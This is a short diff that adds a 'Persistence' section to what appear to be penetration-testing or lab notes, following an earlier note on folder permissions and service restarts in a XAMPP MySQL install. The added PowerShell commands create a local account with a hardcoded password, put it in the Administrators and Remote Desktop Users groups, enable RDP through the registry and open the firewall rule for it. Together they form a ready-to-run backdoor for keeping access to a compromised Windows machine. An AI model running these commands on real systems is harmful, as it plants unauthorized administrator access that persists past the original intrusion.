@@ -1106,3 +1106,17 @@ icacls "C:\xampp\mysql\bin"
 ```
 note: `sc stop` or `sc start` fails with access denied -> may need to wait for reboot or another trigger.
 
+---
+
+Persistence 
+
+```powershell
+net user kira kira_pass123 /add  
+net localgroup administrators kira /add  
+net localgroup "Remote Desktop Users" kira /add
+
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
+```
